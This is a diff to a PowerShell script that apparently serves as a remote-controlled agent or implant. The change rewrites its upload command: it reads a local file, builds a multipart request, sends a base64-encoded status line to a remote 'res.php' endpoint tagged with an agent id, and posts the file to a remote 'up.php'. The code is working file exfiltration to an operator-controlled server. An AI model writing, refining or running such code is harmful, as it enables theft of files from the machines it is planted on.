@@ -74,7 +74,30 @@ $file = ($cmd -split ':',3)[-1]
 	
         continue
     }
-Invoke-Webrequest -URI "$url/up.php?id=$id" -Method POST -InFile "$file"
+$f = Split-Path $file -leaf
+$fileBytes = [System.IO.File]::ReadAllBytes($file);
+$fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
+$boundary = [System.Guid]::NewGuid().ToString(); 
+$LF = "`r`n";
+
+$bodyLines = ( 
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"data`"; filename=`"$f`"",
+    "Content-Type: application/octet-stream$LF",
+    $fileEnc,
+    "--$boundary--$LF" 
+) -join $LF
+
+$c = "Uploading "
+$d = "$($c) $($file)"
+
+$EncdBytes = [System.Text.Encoding]::UTF8.GetBytes($d)
+$Encd = [System.Convert]::ToBase64String($EncdBytes)
+
+$resup=(Invoke-WebRequest "$url/res.php?res=$Encd&$id")
+$up=(Invoke-RestMethod -Uri "$url/up.php?id=$id" -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines)
+
+
 
 }
 
